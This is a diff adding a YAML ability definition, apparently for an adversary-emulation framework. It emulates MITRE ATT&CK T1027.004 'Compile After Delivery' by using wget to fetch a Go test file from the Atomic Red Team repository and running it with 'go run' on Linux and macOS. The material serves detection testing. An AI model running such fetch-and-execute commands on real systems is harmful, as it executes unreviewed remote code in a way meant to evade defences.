@@ -1,0 +1,25 @@
+---
+- id: 5c2244c6b6c1511190380ca28e76441c
+  name: Go compile
+  description: 'Compile a go file with golang on FreeBSD, Linux or Macos.
+
+    '
+  tactic: stealth
+  technique:
+    attack_id: T1027.004
+    name: 'Obfuscated Files or Information: Compile After Delivery'
+  platforms:
+    linux:
+      sh:
+        command: 'if [ -e  a932ec_T1027-004-test.go ]; then : ; else wget https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/src/T1027-004-test.go
+          -O a932ec_T1027-004-test.go; fi;  go run a932ec_T1027-004-test.go'
+        payloads:
+        - a932ec_T1027-004-test.go
+        cleanup: ''
+    darwin:
+      sh:
+        command: 'if [ -e  a932ec_T1027-004-test.go ]; then : ; else wget https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/src/T1027-004-test.go
+          -O a932ec_T1027-004-test.go; fi;  go run a932ec_T1027-004-test.go'
+        payloads:
+        - a932ec_T1027-004-test.go
+        cleanup: ''
